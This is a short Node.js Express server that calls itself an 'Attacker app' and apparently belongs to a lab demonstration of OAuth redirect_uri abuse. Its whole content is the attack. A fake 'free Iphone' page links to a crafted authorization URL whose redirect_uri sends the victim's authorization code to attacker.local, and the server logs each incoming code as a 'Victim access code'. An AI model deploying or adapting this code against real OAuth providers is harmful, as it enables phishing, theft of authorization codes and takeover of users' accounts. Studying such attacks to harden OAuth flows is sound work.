const path = require('path')
const express = require('express')
const ejs = require('ejs')

const app = express()
const port = 3003

app.engine('ejs', ejs.__express);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, './views'));

app.get('/', (req, res) => {
    res.send('<h1> Welcome, Do you want a free Iphone :)<h1>')
    console.log("Victim access code: "+req.query.code)
})


app.get('/win-iphone', (req,res) => {
    let attack = "http://oauth-provider.local/oauth/authorize/?response_type=code&client_id=QRCgN910n7Rr4s3Ee8bf&redirect_uri=http://attacker.local%3Fhttp://preApprovalApp.local/oauth/callback"
    res.render('iphone', {
        attack_url: attack
    })
})

app.listen(port, () => {
    console.log(`Attacker app listening on port ${port}`)
})